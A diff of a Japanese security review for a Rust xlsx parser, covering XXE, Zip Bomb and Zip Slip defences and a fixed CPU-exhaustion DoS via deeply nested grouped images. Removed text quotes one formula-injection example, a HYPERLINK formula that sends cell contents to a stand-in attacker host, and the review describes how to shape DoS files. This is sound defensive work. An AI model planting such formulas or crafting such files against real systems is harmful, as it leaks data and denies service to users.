@@ -1,63 +1,83 @@
-# `docs/design/` セキュリティレビュー
+# `docs/design/` セキュリティレビュー (2026-08-19)
 
-*[English](design-review.en.md)*
+`docs/design/`配下の全設計文書([architecture.md](../design/architecture.md)を起点に、そこからリンクされる`lib.rs`/`error.rs`/`pipeline.rs`/`container/`/`parse/`/`model/`/`resolve/`/`json.rs`の各文書を含む)を対象とした、`master`上の現在の状態に対するフォローアップのセキュリティレビュー。[`old/design-review.md`](old/design-review.md)(2026-08-17、実装着手前)および[`old/code-review.md`](old/code-review.md)(2026-08-17、初回のコードレベルレビュー)の後継にあたる。最初のレビュー時と異なり、現在`src/`は完全に実装されており、「設計→実装→ドキュメント更新」というプロセスを通じて設計文書自体も実装と同期され続けてきた。最初のレビューが見ていなかった複数の機能追加の波(画像アンカーとグループ化画像(Issue #65/#67)、`styles.xml`からのフォント/折返し/配置/書式コード/塗りつぶし色の解決(Issue #37/#38/#41/#42/#75))を含む。本レビューは2026-08-17以降に変わった点——新たに追加された読み取り経路における3大脅威の健全性の継続、および追加された内容に含まれる新しい設計レベルのリスクパターン(計算量、未検証の数値フィールド、未解決のセキュリティ関連オープンクエスチョン)——に焦点を当てる。
 
-`docs/design/` 配下の全設計書（[architecture.md](../design/architecture.md) およびそこからリンクされる `lib.rs` / `error.rs` / `pipeline.rs` / `container/` / `parse/` / `model/` / `resolve/` / `json.rs` 各ファイルの設計書、2026-08-17時点でIssue [#3](https://github.com/MinamiyamaKotaro/xlsxparser/issues/3) の対応関係表を満たす全ファイル）を対象に、要求仕様書2章が要求するセキュリティ要件（Zip Bomb・Zip Slip・XXE対策）を中心としたセキュリティレビューを実施した結果をまとめる。
+以下のfindingは、設計文書自身の記述が具体的で検証可能な主張("上限が存在しない"、"これはO(1)である"等)をしている箇所について`src/`と突き合わせて確認しており、1件は直接の実測(Finding 1)を伴う。本レビューはあくまで設計文書レビューであり、`src/`の全行を対象にしたコード監査ではない——並行するコードレベルのレビューが`src/`の行単位の精査を担う想定。
 
-`src/` はまだ空であり実装は存在しないため、本レビューは**設計書に記述された対策方針そのものの健全性**を評価するものであり、実装コードの脆弱性診断ではない。実装開始後は改めてコードベースに対するセキュリティレビューが必要になる。
+## 総合評価
 
-## 総評
+要求仕様書が名指しする3つの脅威——Zip Bomb・Zip Slip・XXE——は、前回レビュー以降に追加された全モジュールにわたって、健全かつ*一貫して*緩和され続けている。`parse/drawing.rs`(drawing/グループ化画像のパース)と`parse/styles.rs`(styles.xmlのパース)はいずれも、他の`parse/`モジュールと全く同じ必須ゲートウェイ——`Reader`構築のための`create_secure_reader`、DOCTYPE拒否によるXXEゲートの`read_event`、Zip Bombを意識したエラー変換の`convert_xml_error`——を経由しており、`pipeline.rs`の新設フェーズ3.5(画像解決)も、他のすべてのOPCパーツと同じ`container::get_entry`/`parse::parse_relationships`ゲートウェイを通じて`drawingN.xml`/`drawingN.xml.rels`を読み込み、`Internal`な画像ターゲットの存在確認を`has_entry`経由で(バイト列を読む前に)再検証している。既存のゲートウェイを迂回する新しい読み取り経路は見つからなかった。本プロジェクト自身の過去のfinding(バイト数上限の裏に隠れた、攻撃者が制御可能な件数Nを実際には制限しないO(N²)コスト——`docs/security/old/code-review.md` Finding 1、結合セル)の教訓は明らかに内在化されている: `resolve/column_width.rs`(Issue #39、当該finding後に追加)は`MAX_MERGE_REGIONS`の論拠を明示的に引用し、自身のアルゴリズムにO(N²)リスクが無いにもかかわらず同等の防御的上限を適用しており、`parse/drawing.rs`自身の`chExt=0`除算ゼロガードも、本レビューが確認を求められていた数値安全性チェックそのものである。
 
-要求仕様書が明示する3つの脅威（Zip Bomb・Zip Slip・XXE）のうち、Zip BombとZip Slipについては複数の設計書にまたがる多層防御が具体的な型・アルゴリズムのレベルまで一貫して設計されており、健全と判断した。XXE対策については、当初「採用予定のXMLパーサーライブラリの既定動作に依存する」という暗黙の前提にとどまっていた点をFinding 1として指摘したが、本レビューを受けて `parse/mod.rs` に `read_event`（イベント読み取りの唯一の窓口。`Event::DocType` を無条件に拒否する）と、対応する `Error::DoctypeRejected` を追加する設計変更を同一PR内で行い解決済みである。
+しかし、同じ「バイト数上限が攻撃者制御可能なNを制限しない」というパターンが、Issue #67(グループ化画像)で追加された内容の中に、検出されないまま再発していた——今回は*件数*ではなく*深さ*として、二乗ではなく乗算として。これは発見・実測され——結合セルの当初のfindingと全く同じ前例に従い——本レビューサイクルの一部として直ちに修正された。修正と再計測の詳細はFinding 1を参照。副次的な、実害の無い(しかし実在する)ギャップ(Finding 2)として、`docs/design/`内のいくつかの「主要な型」コードブロックが、その散文/依存関係/テスト方針の各節が説明している機能の実装に追従して更新されていなかった点があり、これはまさにFinding 1が今回まで文書ベースのレビューで見過ごされる原因となったのと同種のギャップである。
 
 ## Findings
 
-### ~~Finding 1: XXE対策が明示的な設定ではなく、XMLパーサーの既定動作という暗黙の前提に依存している~~ → **解決**
+### ~~Finding 1: グループ化画像解決における`<xdr:grpSp>`ネスト深さの無制限が、既存のあらゆるサイズ/件数上限の内側でCPU枯渇DoSを可能にする~~ → **解決済み**
 
-* 深刻度: ~~Medium~~ → 解決済み
-* 対象: [parse/mod.md](../design/parse/mod.md) `create_secure_reader`、[parse/mod.md オープンクエスチョン1](../design/parse/mod.md)
-* 内容（指摘当時）: `create_secure_reader` の「主要な型・関数（案）」に示されたコードは `reader.config_mut().trim_text(false);` のみを設定しており、これは共有文字列の空白保持（`xml:space="preserve"`）のための設定であって、XXE対策とは無関係である。XXE対策そのものについては、同ファイルの解説文が「`quick-xml` は非検証型パーサーであり、標準構成のままでも外部実体・外部DTDサブセットのフェッチは行わないため、古典的なXXEはそもそも成立しない」と述べるにとどまり、これを明示的に強制するAPI呼び出しは示されていなかった。
-* リスクシナリオ（指摘当時）: (1) 「`quick-xml`は既定でDTD処理・外部実体参照をサポートしない」という前提が採用バージョンで成立しなくなった場合（将来のマイナーバージョンアップで挙動が変わる、あるいは別のXMLパーサーへ乗り換える判断がなされた場合）、明示的な無効化設定がコード上に存在しないため、この設計のまま実装するとXXE攻撃（ローカルファイル読み取り、SSRF、サービス拒否）が成立しうる。(2) 実装者が本設計書の「暗黙の前提で足りる」という記述をそのまま実装し、要求仕様書2章「XMLパース時において、外部エンティティの展開を無効化する」という明文要件を、実際には何もコードで強制していないにもかかわらず「満たしている」と誤認する可能性がある。
-* 対応内容: [parse/mod.md](../design/parse/mod.md) に、イベント読み取りの唯一の窓口 `read_event` を新設した。`read_event` は `reader.read_event_into(buf)` の結果が `Event::DocType`（`<!DOCTYPE ...>` 宣言）であれば、宣言の内容（実体定義を含むか等）を一切解釈せず無条件に新設の `Error::DoctypeRejected`（[error.md](../design/error.md)）を返す（fail closed）。`parse/` 配下の各モジュールは本関数経由でのみイベントを読み取り、`reader.read_event_into` を直接呼ばない。
-  * **暗黙の前提からの独立**: OOXMLの `_rels`/`workbook.xml`/`sharedStrings.xml`/`styles.xml`/`sheetX.xml` はいずれも仕様上DOCTYPE宣言を持たないため、正当な `.xlsx` に対して誤検知が生じることはない。この対策は「quick-xmlが既定でDTD処理を行わない」という前提（[parse/mod.md オープンクエスチョン1](../design/parse/mod.md)が依然として未確定としている、採用バージョン・`Reader`設定APIの詳細）とは独立して機能する。`Event` enumの構造（`DocType`バリアントの存在）はquick-xmlの主要バージョンを通じて安定しているため、当該オープンクエスチョンの解決状況にかかわらずXXE対策の実効性が保たれる。これが、当初の設計が抱えていた「暗黙の前提への依存」という課題そのものへの根本的な解決である。
-  * **検証可能性**: [parse/mod.md テスト方針](../design/parse/mod.md)に、DOCTYPE宣言と外部実体参照を含む攻撃ペイロードに対し `Error::DoctypeRejected` が返ることを確認する回帰テスト、および正当な入力に対して誤検知しないことを確認する回帰テストを追加した。
+* **深刻度: ~~High~~ → 解決済み**
+* **箇所**: [`parse/drawing.md`](../design/parse/drawing.md)「グループ化画像: `GroupContext`と`resolve_grouped_pic`(Issue #67)」節およびそのオープンクエスチョン4・5。実装は`src/parse/drawing.rs`(`parse_anchor_body`内の`group_stack: Vec<GroupContext>`、および`</xdr:pic>`ごとに1回呼ばれる`resolve_grouped_pic`)。
 
-### ~~Finding 2: Zip Bombのデフォルトサイズ上限が未検証の暫定値であり、利用者側から調整する手段も未確定~~ → **解決**
+* **詳細**: `parse_anchor_body`は`group_stack: Vec<GroupContext>`を保持し、`<xdr:grpSp>`の開始ごとにpush、終了ごとにpopするが、**深さの上限が一切無い**——設計文書は「スタック自身の長さが常に現在のネスト深さである——別途カウンタは不要」とのみ述べており、上限が強制されているとは一切述べていない。`src/parse/drawing.rs`のどこにもそのような上限は存在しない(確認済み: `resolve/merge.rs`の`MAX_MERGE_REGIONS`や`resolve/column_width.rs`の`MAX_COLUMN_WIDTH_RANGES`——両者の設計文書は明示的に文書化・上限設定している——とは異なり、当該ファイルには`MAX_*`定数が一切登場しない)。
 
-* 深刻度: ~~Low~~ → 解決済み
-* 対象: [container/sanitize.md](../design/container/sanitize.md) `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）、[container/sanitize.md オープンクエスチョン1](../design/container/sanitize.md)
-* 内容（指摘当時）: サイズ上限の実装方式（実際に読み出したバイト数をストリーミングでカウントし、ZIPヘッダーの自己申告サイズを信頼しない）自体は健全に設計されている。しかし上限の具体的な値は「暫定値」と明記されたままであり、また `lib.rs` の公開API（[lib.md](../design/lib.md)）に上限を呼び出し側が調整できるオプションは存在しなかった。
-* リスクシナリオ（指摘当時）: デフォルト値が実運用の入力ファイルサイズ分布に対して大きすぎる場合、単一プロセスでの同時処理数によってはメモリ枯渇（DoS）のリスクが相対的に高まる。逆に小さすぎる場合、正当な大規模ファイル（要求仕様書が主眼とする「方眼紙Excel」）を誤って拒否する可用性の問題が生じる。
-* 対応内容: 要求仕様書自体には具体的なファイルサイズ上限の記載がないため、実務上の巨大シート（数十万〜100万セル規模）の展開後XMLサイズが概ね10〜50 MiB程度に収まるという実測に基づく分析を踏まえ、プロダクトオーナーが `DEFAULT_MAX_UNCOMPRESSED_SIZE`（512 MiB）/ `DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`（2 GiB）を最終値として確定した（正当な入力を誤って拒否しない十分な余裕を持ちつつDoSを抑制できる値と判断）。呼び出し側からの上書きは、[lib.md](../design/lib.md) が新設した `SizeLimits` 構造体（[container/sanitize.md](../design/container/sanitize.md)）と、既存の `parse_workbook`/`parse_workbook_reader` に上限を明示指定できるバリアント `parse_workbook_with_limits`/`parse_workbook_reader_with_limits` を通じて可能にした。`pipeline::run` が `SizeLimits` を受け取り、[container/mod.md](../design/container/mod.md) が既に `pub(crate)` で実装していた `with_max_entry_size`/`with_max_total_size` へ橋渡しする（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。
+  `resolve_grouped_pic(group_stack, ..)`は、グループツリー内のどこであれ`</xdr:pic>`終了タグが見つかるたびに1回呼ばれ(`src/parse/drawing.rs`194行目付近)、そのコストは**O(現在のネスト深さ)**である——`group_stack`*全体*を逆順に走査し、各階層の線形変換(`docs/design/parse/drawing.md`自身の記述: `child' = off + (child - chOff) * (ext/chExt)`、「最内層から最外層へ」適用)を適用する。`<xdr:grpSp>`は任意の深さで任意個の兄弟`<xdr:pic>`要素を含みうり、DrawingMLにはネスト深さへのスキーマレベルの制限が無いため、1つのdrawingパーツが`D`段のネストと最内層の`N`枚の兄弟画像を持つ場合、総パースコストは**O(N × D)**になる——一方でそのようなファイルを構築するXMLバイトコストはO(N + D)(加算のみ)にすぎない。これはまさに、既に修正済みの結合セルのfinding(`docs/security/old/code-review.md` Finding 1: バイト数上限がNを制限しないことに隠れたO(N²)コスト)と同じ形——ただし今回は1つの件数の自乗ではなく、互いに独立して安価に膨張させられる2つの軸(深さと兄弟数)の掛け算であり、結合セルの場合と異なり、**どちらの軸についても防御的な上限が一度も追加されていなかった**。
 
-### ~~Finding 3: 数式由来・共有文字列由来のテキスト値がエスケープなしでそのまま公開APIへ渡され、下流でのCSV/数式インジェクションのリスクについて利用者向けの注意喚起がない~~ → **解決**
+* **実測による確認**: `parse_drawing`(設計文書が説明する純粋なXMLパースのエントリポイントそのもの)を直接呼び出す一時的な`#[ignore]`付きユニットテストを追加し、`<xdr:grpSp>`のネストと兄弟`<xdr:pic>`数を合成的に生成して計測後、元に戻した(作業ツリーに残留する変更なし——`src/parse/drawing.rs`のgit履歴はクリーン)。現在の`master`ビルド(releaseプロファイル、Apple系ハードウェア、シングルスレッド)での計測:
 
-* 深刻度: ~~Low~~ → 解決済み（本ライブラリ自体の脆弱性ではなく、利用者側の誤用によって顕在化するリスクであるため、元々Low）
-* 対象: [model/cell.md](../design/model/cell.md) `CellValue::Text`、[json.md](../design/json.md)、[lib.md](../design/lib.md)
-* 内容（指摘当時）: `.xlsx` のセル文字列（数式の計算結果文字列 `t="str"` を含む）は、設計上いかなる無害化処理も経ずに `CellValue::Text` としてそのまま `Workbook` に格納され、`to_json_string`/`to_json_writer` を通じてJSON文字列としてそのまま出力される。JSON自体への出力という文脈では（`serde_json` が適切にエスケープするため）安全だが、このJSONやWorkbookを受け取った下流システムが値をCSVやXLSXへ再エクスポートする場合、セル値が `=`, `+`, `-`, `@` 等で始まる文字列であれば、再エクスポート先のスプレッドシートアプリケーションで数式として実行されうる（いわゆるCSV Injection / Formula Injection）。これは本ライブラリの入力（信頼できない`.xlsx`）がそのまま出力(信頼できないテキスト)として透過する設計上、当然の帰結ではあるが、設計書・READMEのいずれにもこのリスクへの言及がなかった。
-* リスクシナリオ（指摘当時）: 攻撃者が悪意あるセル値（例: `=HYPERLINK("http://evil.example/?"&A1,"click")`）を含む `.xlsx` を、本ライブラリを利用するアップロード機能へ提出する。アップロード先システムが解析結果をそのままCSVエクスポート機能や別の `.xlsx` 生成機能へ渡し、別の被害者（社内の別担当者等）がそのファイルを開くと、埋め込まれた数式が実行され、情報窃取やフィッシングにつながりうる。
-* 対応内容: 本ライブラリ自体が値を書き換える設計変更は要求仕様書のスコープ外のため見送り、代わりに [README.md](../../README.md)「Security notes」節と `src/lib.rs`（[lib.md](../design/lib.md)）のクレートルートdocコメントの両方に、「本ライブラリが返す文字列値はセル内容をそのまま透過する。CSV/スプレッドシート形式として再エクスポートする呼び出し側は、数式インジェクション対策（先頭文字 `=`/`+`/`-`/`@` のエスケープ等）を各自の責務で実施すること」という趣旨の注意書きを追加した（Issue [#14](https://github.com/MinamiyamaKotaro/xlsxparser/issues/14)）。
+  | ネスト深さ(D) | 最内層の画像枚数(N) | XMLサイズ | 所要時間 |
+  | ---: | ---: | ---: | ---: |
+  | 100 | 100,000 | 29.8 MB | 191 ms |
+  | 100,000 | 100 | 15.5 MB | 193 ms |
+  | 5,000 | 5,000 | 2.26 MB | 135 ms |
+  | 20,000 | 2,000 | 3.69 MB | 222 ms |
+  | 50,000 | 1,000 | 8.0 MB | 325 ms |
+  | 100,000 | 5,000 | 17.0 MB | **2.33 秒** |
+  | 50,000 | 50,000 | 22.6 MB | **10.9 秒** |
 
-### Finding 4: カスタム数値書式（`numFmtId >= 164`）の日付/時刻判定ヒューリスティックの実装方式が未確定であり、正規表現による実装を選んだ場合はReDoSの入力経路になりうる
+  最初の2行(Nが大きくDが小さい、またはDが大きくNが小さい——すなわちどちらか一方の軸のみ)は安価なままであり、コストが実際に2軸の*積*であって、どちらか単独の値ではないことを裏付けている。最後の2行は、わずか17〜23MB——512MiBの1エントリあたりZip Bomb上限にも2GiBの累積上限(`container/sanitize.md`の`DEFAULT_MAX_UNCOMPRESSED_SIZE`/`DEFAULT_MAX_TOTAL_UNCOMPRESSED_SIZE`)にも遠く及ばず、他のいかなる既存の指標から見ても異常に大きなワークブックとは言えないファイル——が、通常の`parse_workbook`/`parse_workbook_reader`実行中に`pipeline.rs`のフェーズ3.5から呼ばれる`parse_drawing`内で、既に数秒の完全に同期的なCPUブロッキングを発生させることを示している。結合セルのfindingで測定されたのと同じ二乗則の伸びで外挿すると、50〜100MB規模(1エントリあたり上限には依然遠く及ばない)のdrawingパーツは、修正前の結合セルfindingと同じ深刻度クラスである数十秒〜数分に達することが十分ありうる。
 
-* 深刻度: **Low**（現状は具体的な実装方式が未確定のプレースホルダーであり、確定した脆弱性ではない）
-* 対象: [parse/styles.md](../design/parse/styles.md) `is_date_time_format`、同ファイル オープンクエスチョン2
-* 内容: `formatCode`（`styles.xml` 由来の信頼できない外部入力）を「ヒューリスティックに走査」して日付/時刻書式かを判定する設計だが、具体的な実装アルゴリズム（トークンの線形スキャンか、正規表現によるパターンマッチか）は未確定。もし実装時に破局的バックトラッキング（catastrophic backtracking）を起こしうる正規表現を採用した場合、`formatCode` は攻撃者が完全に制御できる文字列であるため、意図的に構成された `styles.xml` によって単一の書式判定処理がCPU時間を著しく消費させられる可能性がある。
-* リスクシナリオ: 攻撃者が極端に長く反復的な `formatCode` 文字列（例: `\` エスケープを多用したパターン）を含む `styles.xml` を仕込んだ `.xlsx` を提出し、`is_date_time_format` の呼び出しが実質的にハングする。
-* 推奨対応: 実装時に採用するアルゴリズムを線形時間で完結する単純なトークンスキャン（バックトラッキングを伴わない状態機械等）に限定し、正規表現を用いる場合は非バックトラッキングエンジン（例: `regex` クレート、Rust版の`regex`crateはRE2ベースで線形時間保証がある）を用いることを [parse/styles.md](../design/parse/styles.md) の実装メモに明記する。
+* **部分的な緩和要因**: `group_stack`は明示的にヒープ確保された`Vec`であり、ネイティブなコールスタック再帰ではない。そのため、素朴な再帰下降型のXMLネストパーサーとは異なり、深さ単体に起因するスタックオーバーフローのリスクは無い——コストはCPU時間(および副次的に`Vec<GroupContext>`自身のヒープ成長、CPUコストと比べれば無視できる)である。これは設計上の実際の長所であり「設計上妥当と判断した点」に記載するが、上記のCPU枯渇分析自体は変わらない。
 
-## 健全と判断した設計（Findingとしては計上しないが、根拠を明記する）
+* **リスクシナリオ**: 攻撃者が、深くネストした`<xdr:grpSp>`ツリーと最内層に中程度の枚数の兄弟画像を持つ`drawingN.xml`を含む`.xlsx`(または`parse_workbook`/`parse_workbook_reader`を未検証入力に対して呼ぶあらゆるシステム、例えば文書アップロード機能)を送信する——数十MB規模で、文書化・強制されているあらゆるサイズ/件数上限の内側に十分収まり、既存のあらゆるチェック(Zip Bomb・Zip Slip・XXE・`MAX_MERGE_REGIONS`・`MAX_COLUMN_WIDTH_RANGES`)のどれにも引っかからずに通過する。呼び出し元スレッド(典型的にはWebサーバーのリクエストハンドラ)は`parse_drawing`内で数秒〜場合によっては数分ブロックされる。この形状のリクエストを少数同時に送るだけで、スレッド/ワーカープールを枯渇させられる——結合セルの当初のfindingのリスクシナリオの組み立てと完全に一致する。
 
-* **XXE対策**（[parse/mod.md](../design/parse/mod.md) `read_event`）: Finding 1の指摘を受けて追加された、`Event::DocType` を無条件に拒否するfail closed設計。XMLパーサーの既定動作という暗黙の前提とは独立して機能する明示的・検証可能な対策になっている（詳細は上記Finding 1参照）。
-* **Zip Bomb対策**（[container/sanitize.md](../design/container/sanitize.md)）: ZIPヘッダーの自己申告サイズを信頼せず、`BoundedReader` が実際に読み出されたバイト数をストリーミングでカウントしてエントリ単体・累積の両方を強制する設計は、圧縮率を偽装する古典的なZip Bombに対して有効である。
-* **Zip Slip対策の多層防御**（[container/sanitize.md](../design/container/sanitize.md) `validate_entry_path` / [container/mod.md](../design/container/mod.md) `get_entry` の毎回再検証 / [parse/relationships.md](../design/parse/relationships.md) `resolve_target_path`）: アーカイブオープン時の一括検証、`get_entry` 呼び出しごとの再検証（rels由来の動的パスに対する多層防御として明示的に設計）、および実ディスクへの展開を一切行わない設計（sanitize.mdが明記する「本ライブラリはZIPエントリを実ディスクへ展開しないため、伝統的なZip Slip被害である『意図しないファイル書き込み』は直接には発生しない」）の三重の防御線が一貫して設計されている。`resolve_target_path` が生成しうる異常パス（過剰な `..`）を意図的に早期拒否せず最終防御を `get_entry` に委ねる設計判断も、責務分担として妥当である。
-* **数値パースにおけるパニック回避**（[model/cell.md](../design/model/cell.md) `CellRef::from_a1`）: 桁溢れを起こす行番号文字列に対して `panic` せず `Result` を返す方針が明記されており、信頼できない入力に対する堅牢性が確保されている。
-* **fail-closed原則の一貫性**（[resolve/merge.md](../design/resolve/merge.md) の結合範囲検証、[container/sanitize.md](../design/container/sanitize.md) の `validate_entry_path`、[pipeline.md](../design/pipeline.md) の各フェーズ早期リターン）: 不正・不整合な入力を検知した場合に部分的な結果を返さず処理全体を中断する方針が複数のモジュールにまたがって一貫して採用されている。
-* **外部クレートエラーの型消去による依存の遮断**（[error.md](../design/error.md)）: XMLパーサー・（将来的な）JSONシリアライザのエラー型をパブリックAPIに直接晒さない設計により、これらのクレートの内部実装詳細（バージョン固有のエラーメッセージ等）が利用者側のコードに漏出する経路を最小化している。
-* **`Error::Io` のDisplay文言からのファイルパス除外**（[error.md](../design/error.md)）: `path` フィールドを構造体には保持しつつ `Display`（`{error}` 相当の文言）には含めない設計により、呼び出し側が `err.to_string()` を安易にログ・レスポンスへ出力しても、サーバーのファイルシステムパスが不用意に露出しにくい。
+* **解決内容**: 推奨事項通りに実装した。`src/parse/drawing.rs`は現在`pub(crate) const MAX_GROUP_NESTING_DEPTH: usize = 64`を定義し、`parse_anchor_body`の`b"grpSp"`開始タグ分岐内でチェックする——ネストしたグループの開始タグが`group_stack`をこの上限より深く積もうとした場合、新設した`Error::TooManyNestedGroups { path, depth, limit }`([`src/error.rs`](../../src/error.rs)、`Error::TooManyMergedRanges`/`Error::TooManyColumnWidthRanges`と同じ形)を、そのグループのそれ以上の内容を読む前に即座に返す。
 
-## 対象外・スコープ外とした事項
+  同時に、関連する2つ目の上限も追加した: `resolve_grouped_pic`の最終的な解決後の`(x, y, cx, cy)`について、`is_finite()`および防御的な妥当性上限(`MAX_PLAUSIBLE_EMU = 10^12`、約27.7km——Excelの実際の最大シート範囲を大きく上回る)に対するチェックを行い、いずれかに失敗した場合は`Error::InvalidPackage`を返す——これにより、`MAX_GROUP_NESTING_DEPTH`に到達するよりずっと前に、少数のネスト段数で極端な`ext`/`chExt`比率によって解決後の座標を`f64::INFINITY`(Rustの飽和的なfloat→int変換により`i64::MAX`へ静かに飽和する)まで到達させられるという、関連するより小規模な問題を解消している——この2件目の問題の詳細は[`code-review.md`](code-review.md) Finding 2を参照。
 
-* ~~結合範囲の検証アルゴリズムの計算量（O(N²)）や、行・セル数に応じたCPU時間の増大など、純粋なリソース枯渇（DoS）に関する懸念は、要求仕様書のZip Bomb対策（バイト数ベースの上限）で入力サイズ自体が有界であることを踏まえ、本レビューのスコープ外とした。~~ → **前提の誤りが判明、実装レベルで対応済み**: 実装完了後の [`docs/security/code-review.md` Finding 1](code-review.md) で、この「Zip Bombのバイト数上限が結合範囲の件数Nを実質的に有界にする」という前提そのものが誤りであることが実測で判明した（`<mergeCell>` 1件は約20〜30バイトしかなく、512MiBの上限内に1,700万件以上収まるため）。数百KB〜数MBのファイルで数十秒〜数分のCPU拘束を引き起こせることを確認し、`resolve::merge::MAX_MERGE_REGIONS`（既定20,000件）による防御的な件数上限を追加して対応した。詳細は [`docs/design/resolve/merge.md` オープンクエスチョン2の追記](../design/resolve/merge.md)および [`docs/security/code-review.md` Finding 1](code-review.md) を参照。
-* `container/` が採用するZIP操作クレートの選定（[container/mod.md オープンクエスチョン1](../design/container/mod.md)）が確定していないため、当該クレート自体の既知脆弱性（サプライチェーンリスク）は本レビューでは評価していない。クレート選定時に別途評価が必要。
-* 実装コード自体は存在しないため、メモリ安全性（Rustの言語機能により保証される）や、本レビューが指摘した設計方針からの実装時の逸脱は対象外とした。実装完了後に改めてコードレベルのセキュリティレビューを実施すること。
+  `src/parse/drawing.rs`に回帰テストを追加した: `group_nesting_depth_at_the_limit_is_accepted`/`group_nesting_depth_over_the_limit_is_too_many_nested_groups`が64/65のちょうど境界をカバーし(`resolve/merge.rs`の`region_count_at_the_limit_is_accepted`/`region_count_over_the_limit_is_too_many_merged_ranges`のパターンに倣う)、`extreme_group_transform_scale_is_rejected_as_invalid_package`が2件目の問題をカバーする。
+
+  修正後に上表と同じ攻撃形状(以前は無制限に実行されていたD=100,000/N=100の形状)を再計測したところ、**1ミリ秒未満で拒否**された——O(N × D)の変換処理が一切走る前に、深さチェックがネスト段数65で発火するため。
+
+  `docs/design/parse/drawing.md`のエラー処理方針・テスト方針・未決事項(新規項目7)を更新し、両方の上限を文書化した。
+
+### Finding 2: いくつかの設計文書の「主要な型」コードブロックが、その散文が説明する機能の実装に追従して更新されておらず、文書のみに基づくセキュリティレビューが新規追加の数値フィールドを検証する能力を損なっている
+
+* **深刻度: Low(文書・プロセス上のギャップであり、それ自体は脆弱性ではない)**
+* **箇所**: [`model/sheet.md`](../design/model/sheet.md)(「主要な型」コードブロック、14〜240行目に`Image`/`ImageAnchor`/`AnchorMarker`/`ImageExtent`/`ColWidthRange`の定義が無い。すぐ下の「機能: 画像(Issue #65)」「機能: 列幅(Issue #39)」の散文節、および依存関係節は、これらについて詳細に論じているにもかかわらず); [`json.md`](../design/json.md)(「主要な型」コードブロックに`images`/`columns`のシリアライズコードが無い——`JsonImage`/`JsonImageAnchor`/`JsonAnchorMarker`型も`state.serialize_field("images", ..)`呼び出しも無い。自身の依存関係節は`Sheet::images`、`Image`、`ImageAnchor`、`AnchorMarker`を依存先として明示しており、テスト方針にも`images`のシリアライズ形式に関する専用項目があるにもかかわらず); [`model/mod.md`](../design/model/mod.md)(その再エクスポート一覧`pub use sheet::{MergedRegion, Sheet, SheetVisibility};`は、`ColWidthRange`・`Image`・`ImageAnchor`・`AnchorMarker`・`ImageExtent`を欠いている——`json.md`自身の依存関係の記述`crate::model::{ColWidthRange, Sheet}`(`resolve/column_width.md`で使用)によれば、これらは全て今日の`src/model/sheet.rs`に存在する)
+
+* **詳細**: 本プロジェクトの明言された進め方(ユーザー自身の標準的な指示による)は設計→実装→テストであり、各機能が着地した後は`docs/design/`が能動的に同期され続ける——本レビュー全体を通じてこれはほぼ完璧に維持されていた(Issue #37/#38/#39/#40/#41/#42/#65/#67/#75のいずれも、正確な構造体・フィールド名、エラーバリアント、さらには実測されたベンチマーク数値まで含む、実装に忠実な詳細な散文を残していた)。しかし、`drawingN.xml`から読み取られ公開JSON出力へそのまま伝播する攻撃者制御可能な数値データを保持する`AnchorMarker { cell, col_off: i64, row_off: i64 }`/`ImageExtent { cx: i64, cy: i64 }`/`ImageAnchor`/`Image`という実際のRust構造体定義は、`src/model/sheet.rs`に存在する(直接確認済み)にもかかわらず、`model/sheet.md`自身の「主要な型」コードサンプルには一度も示されておらず、散文でのみ説明されている。`Sheet::images`/`col_width_ranges`が実際に`json.rs`でどうシリアライズされるかについても同じギャップがある。
+
+  これが本レビューにとって特に重要なのは、Finding 1がまさにこの種の新規追加された数値/ネストロジックに関するものだからである——設計文書のコードサンプルのみに基づいて作業するレビュアー(本レビューの依頼内容が想定していた通り)は、`i64`のEMUフィールドの境界チェック方針(文書化されておらず、実際には通常の`i64`パース成功以上のチェックは強制されていない——下記の注記参照)や`group_stack`/`resolve_grouped_pic`の形状そのものを、散文を節ごとに読む以外の方法では確認できない——通常レビュアーが権威あるインターフェース要約として扱うはずの「主要な型」ブロックからは見えない。Finding 1のギャップと本ドキュメントギャップが同じモジュールに存在するのは、おそらく偶然ではない。
+
+  別件として、それ自体はfindingとするほどのリスクではないが: `AnchorMarker::col_off`/`row_off`と`ImageExtent::cx`/`cy`(EMU単位)は`parse_attr_i64`(`src/parse/drawing.rs`で確認済み)経由でパースされ、「`i64`としてパースできる」以上の範囲チェックは一切無い——攻撃者は`cx="9223372036854775807"`を設定でき、それは変更されずにJSON出力へプレーンな整数として伝播する。`serde_json`は大きな`i64`値を(指数表記ではなく)リテラルな整数としてレンダリングするため、`JSON.parse`を使うJavaScript側の消費者は2^53を超えた時点で精度を静かに失う——これは本ライブラリ自体の脆弱性ではなく(`resolve_grouped_pic`内のいかなる内部計算も、スケール係数が`f64`で計算されるためこれによってオーバーフローすることはない)、下流の消費者にとってのデータ忠実性上の落とし穴であり、`model::CellRef`の行/列境界チェックが別のフィールドについて既に対処したのと同じ設計上のトレードオフの範疇にあると言えるが(`docs/security/old/code-review.md` Finding 2)、現状`model/sheet.md`の未決事項には文書化されていない。
+
+* **リスクシナリオ**: それ単体では直接悪用可能ではない。リスクはプロセス・検証可能性の面にある——将来の設計文書のみに基づくセキュリティレビュー(または関連機能を実装する新規コントリビューター)が、`model/sheet.md`や`json.md`のコードサンプルを単独で読み、それらのサンプルが関連する型の完全かつ最新の全体像であると合理的に結論づけてしまい、まさにFinding 1が説明するようなギャップを見逃す可能性がある。
+
+* **推奨事項**: `Image`/`ImageAnchor`/`AnchorMarker`/`ImageExtent`/`ColWidthRange`の構造体定義を`model/sheet.md`の「主要な型」コードブロックへ反映する(既に完全に実装され安定している`src/model/sheet.rs`からほぼそのままコピーできる)、対応する`images`/`columns`のシリアライズコードを`json.md`の「主要な型」ブロックへ追加する、`model/mod.md`の再エクスポート一覧に不足している型を追加し`src/model/mod.rs`の実際の再エクスポートと一致させる。その際、`model/sheet.md`の未決事項に、EMUフィールドの大きさに上限が無いことと、それに起因する大きな整数のJSON精度上の注意点を(結論が「許容する、脆弱性ではない」であっても——`docs/security/old/code-review.md` Finding 2が`CellRef`について扱ったのと同様に)一行追記すること。
+
+## 設計上妥当と判断した点(findingとしては数えないが、根拠とともに記録する)
+
